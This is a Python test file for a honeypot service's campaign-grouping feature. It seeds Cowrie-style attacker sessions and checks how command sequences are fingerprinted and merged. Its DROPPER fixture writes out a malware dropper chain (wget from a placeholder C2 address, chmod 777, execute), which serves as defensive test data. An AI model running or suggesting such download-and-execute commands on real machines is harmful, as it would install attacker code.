"""Campaign grouping, against its own index so live traffic cannot satisfy it."""

import contextlib
import uuid
from datetime import UTC, datetime, timedelta

from elasticsearch.helpers import async_bulk

from app.config import get_settings
from app.es.bootstrap import bootstrap_es
from app.es.client import get_es
from app.services import campaigns
from app.services.campaigns import fingerprint, list_campaigns

DROPPER = ["cd /tmp", "wget http://{c2}/x.sh", "chmod 777 x.sh", "./x.sh"]


def _session(sid: str, ip: str, honeypot: str, commands: list[str], start: datetime) -> list[dict]:
    """Cowrie-format events; the index's default pipeline maps them to ECS."""
    docs = [
        {
            "eventid": "cowrie.login.success",
            "username": "root",
            "src_ip": ip,
            "session": sid,
            "timestamp": start.isoformat(),
        }
    ]
    for i, command in enumerate(commands, start=1):
        docs.append(
            {
                "eventid": "cowrie.command.input",
                "input": command,
                "src_ip": ip,
                "session": sid,
                "timestamp": (start + timedelta(seconds=i)).isoformat(),
            }
        )
    return [
        {
            "_index": get_settings().es_index,
            "_source": {**d, "honeypot": {"id": honeypot, "name": honeypot}},
        }
        for d in docs
    ]


# A context manager, not an async fixture: the Elasticsearch client caches an
# aiohttp session on the loop that first used it, and a fixture's loop is not
# the test's. Same reason `test_intel` cleans up inline.
@contextlib.asynccontextmanager
async def _corpus(monkeypatch):
    index = f"honeypot-events-camp-{uuid.uuid4().hex[:8]}"
    get_settings.cache_clear()
    monkeypatch.setenv("ES_INDEX", index)
    es = get_es()
    now = datetime.now(UTC)
    try:
        await bootstrap_es()
        actions = [
            # The same dropper from two addresses, two C2 hosts, two sensors.
            *_session(
                "c-a",
                "203.0.113.1",
                "hp-a",
                [c.format(c2="198.51.100.7") for c in DROPPER],
                now - timedelta(minutes=30),
            ),
            *_session(
                "c-b",
                "203.0.113.2",
                "hp-b",
                [c.format(c2="198.51.100.99") for c in DROPPER],
                now - timedelta(minutes=20),
            ),
            # Same commands, different order: different behaviour.
            *_session(
                "c-c",
                "203.0.113.3",
                "hp-a",
                [c.format(c2="198.51.100.7") for c in reversed(DROPPER)],
                now - timedelta(minutes=10),
            ),
            # Login only. Every such session has the same empty sequence.
            *_session("c-d", "203.0.113.4", "hp-a", [], now - timedelta(minutes=5)),
            *_session("c-e", "203.0.113.5", "hp-a", [], now - timedelta(minutes=4)),
        ]
        await async_bulk(es, actions, refresh="wait_for")
        yield
    finally:
        for name in await es.indices.get_alias(name=index):
            await es.indices.delete(index=name)
        get_settings.cache_clear()


async def test_one_script_from_two_addresses_and_two_c2_hosts_is_one_campaign(monkeypatch) -> None:
    async with _corpus(monkeypatch):
        result = await list_campaigns()

        assert result.complete
        assert result.sessions_considered == 3  # c-d and c-e ran no commands
        [campaign] = result.campaigns
        assert campaign.session_count == 2
        assert campaign.session_ids == ["c-b", "c-a"]  # newest first
        assert campaign.attacker_ip_count == 2
        assert sorted(campaign.honeypot_ids) == ["hp-a", "hp-b"]
        # The C2 address is masked, which is what made the two runs one campaign.
        assert "wget http://<ip>/x.sh" in campaign.commands
        assert campaign.command_count == len(DROPPER)


async def test_reordered_commands_and_command_less_sessions_are_not_merged(monkeypatch) -> None:
    async with _corpus(monkeypatch):
        result = await list_campaigns(min_sessions=1)

        by_sessions = {tuple(sorted(c.session_ids)) for c in result.campaigns}
        assert by_sessions == {("c-a", "c-b"), ("c-c",)}


async def test_a_denied_sensor_cannot_contribute_a_session(monkeypatch) -> None:
    async with _corpus(monkeypatch):
        result = await list_campaigns(deny_honeypots={"hp-b"})

        assert result.campaigns == []
        assert result.sessions_considered == 2


async def test_a_session_is_never_fingerprinted_from_part_of_its_commands(monkeypatch) -> None:
    async with _corpus(monkeypatch):
        # Room for one session's commands and part of the next. Admitting the part
        # would fingerprint a truncated script; it must be left out and reported.
        monkeypatch.setattr(campaigns, "_MAX_COMMAND_EVENTS", len(DROPPER) + 2)

        result = await list_campaigns(min_sessions=1)

        assert not result.complete
        assert result.incomplete_reason == "command_event_limit"
        assert result.sessions_considered == 1
        [campaign] = result.campaigns
        assert campaign.command_count == len(DROPPER)


def test_fingerprint_ignores_volatile_literals_but_not_order() -> None:
    a = fingerprint(["wget http://1.2.3.4/x", "sh x"])
    assert a == fingerprint(["WGET  http://5.6.7.8/x", "sh x"])
    assert a != fingerprint(["sh x", "wget http://1.2.3.4/x"])
